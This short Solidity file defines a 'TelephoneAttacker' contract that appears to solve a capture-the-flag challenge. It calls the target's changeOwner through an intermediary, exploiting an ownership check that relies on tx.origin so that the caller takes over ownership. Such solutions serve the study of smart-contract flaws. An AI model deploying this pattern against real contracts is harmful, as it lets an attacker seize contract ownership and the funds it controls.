// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ITelephoneChallenge{
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    ITelephoneChallenge public challenge;


    constructor(address challengeAddress){
        challenge = ITelephoneChallenge(challengeAddress);
    }

    function attack() public {
        challenge.changeOwner(tx.origin);
    }
}